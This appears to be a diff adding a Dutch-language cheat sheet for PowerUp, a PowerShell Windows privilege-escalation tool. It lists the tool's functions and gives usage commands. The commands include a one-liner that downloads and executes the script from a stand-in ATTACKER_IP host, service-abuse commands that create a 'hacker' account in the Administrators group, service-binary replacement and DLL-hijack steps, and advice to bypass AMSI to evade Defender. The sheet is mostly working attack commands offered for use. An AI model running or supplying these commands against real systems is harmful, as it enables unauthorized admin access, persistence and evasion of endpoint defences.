@@ -1,0 +1,49 @@
+# PowerUp — Windows privilege escalation checker (PowerShell)
+# Zoekt automatisch naar veelvoorkomende Windows misconfigurations voor privilege escalation
+#
+# === Syntax ===
+# . .\PowerUp.ps1
+# Invoke-AllChecks
+#
+# === Belangrijkste functies ===
+# Invoke-AllChecks              Alle checks uitvoeren
+# Get-UnquotedService           Unquoted service paden
+# Get-ModifiableService         Services met wijzigbare config
+# Get-ModifiableServiceFile     Schrijfbare service binaries
+# Get-ModifiableScheduledTask   Schrijfbare scheduled task bestanden
+# Get-RegistryAutoLogon         Autologon credentials in registry
+# Get-CachedGPPPassword         Gecachte Group Policy wachtwoorden
+# Write-ServiceBinary           Maak malafide service binary
+# Install-ServiceBinary         Vervang service binary
+# Invoke-ServiceAbuse           Misbruik schrijfbare service config
+# Write-HijackDll               Maak DLL voor hijacking
+#
+# === Voorbeelden ===
+
+# Script laden en alle checks draaien
+powershell -ep bypass
+. .\PowerUp.ps1
+Invoke-AllChecks
+
+# Remote laden en uitvoeren
+IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/tools/PowerUp.ps1')
+Invoke-AllChecks
+
+# Resultaat opslaan als HTML
+Invoke-AllChecks | Out-File -Encoding ASCII checks.txt
+
+# Service abuse: voeg gebruiker toe via kwetsbare service
+Invoke-ServiceAbuse -Name 'vuln_svc' -UserName 'DOMAIN\USER'
+
+# Service abuse: custom commando
+Invoke-ServiceAbuse -Name 'vuln_svc' -Command "net user hacker P@ssw0rd123 /add && net localgroup Administrators hacker /add"
+
+# Service binary vervangen
+Write-ServiceBinary -Name 'vuln_svc' -Path 'C:\Program Files\vuln\service.exe' -UserName 'hacker' -Password 'P@ssw0rd123'
+Restart-Service vuln_svc
+
+# DLL hijack binary schrijven
+Write-HijackDll -DllPath 'C:\Program Files\vuln\missing.dll' -UserName 'hacker' -Password 'P@ssw0rd123'
+
+# NOTE: Wordt gedetecteerd door Defender/AMSI — bypass AMSI eerst
+# NOTE: SharpUp is het C# alternatief dat PowerShell vermijdt
